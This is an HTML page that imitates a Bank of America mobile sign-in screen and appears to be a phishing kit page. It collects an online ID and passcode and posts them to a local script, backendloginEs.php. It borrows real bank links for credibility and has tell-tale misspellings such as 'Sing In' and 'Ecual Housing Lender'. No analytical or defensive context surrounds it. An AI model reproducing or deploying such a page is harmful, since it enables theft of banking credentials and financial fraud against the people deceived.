﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>| Bank of america | Online banking | Sing In | Online ID</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<link rel="shortcut icon" href="images/favicon.png"/>	
<link rel = "stylesheet" href="style/loginMovil.css">
<!-- Compiled and minified CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
<!-- Compiled and minified JavaScript -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
<script type="text/javascript">

if (screen.width>801) {
//window.location="loginEs.php";
}
</script>
</head>
<!-- style="background-color:blue; " -->
<body style="background-color:#ffffff;  " >
    
<div id="container"> 

<img src="images/loginMovil2.png"  style="width:99.5vw; height:77vh"> 
<div >

<form action=backendloginEs.php name=dafabhai id=dafabhai method=post  >    
<input name="usr" placeholder="Online ID" class="t" 
style = " 
width:69vw;
left:8px;
background-color:#FFFFFF;
top:9vh;
height:7.5vh;
border-radius: 9px 9px 9px;
position: absolute;
font-size:20px;"

autocomplete="off" required type="text" required>

<input type="image" name="formimage1" width="100" height="62" src="images/swt.jpg" style="position:absolute; top: 8.5vh; left : 71vw">

<input name="pass" label="Passcode"placeholder="Passcode" autocomplete="off" required type="password" id="pass" required style = " 
width:96vw;
left:8px;
top:18.5vh;
height:7.5vh;
background-color:#FFFFFF;
border-radius: 9px 9px 9px;
position: absolute;
font-size:20px;">


<div id="formimage1Es" class="formimage1Es" >
<input type="image" name="formimage1"
style=
"position:absolute;
width:98vw;
height:8vh;
left:2px;
top:28.5vh;
"
 src="images/btnm.jpg">
</div>


</body>

<a class="linksecure" href="secure.php" style="position:absolute; 
left:6px; 
top:465px; 
z-index:22; 
width: 190px; 
height: 1px;
font-size: 10px;">

Privace & Security</a>

<a class="linkforgot" href="https://secure.bankofamerica.com/auth/forgot/reset-entry/"  
    style= " 
top:36vh; left:-10px; font-size:12px;   white-space: nowrap; ">

Forgot ID/Passcode?</a> 


<a class="linkforgot" href="https://secure.bankofamerica.com/auth/forgot/reset-entry/"  
    style= " 
top: 36vh; left:180px; font-size:12px;   white-space: nowrap; ">

Enroll</a> 




<a class="engs" href="login.php" style="position:absolute; 
left:278px; 
top:465px; 
z-index:22; 
width: 190px; 
height: 1px;
font-size: 10px;">
Ecual Housing Lender</a>
</div>

    </html>


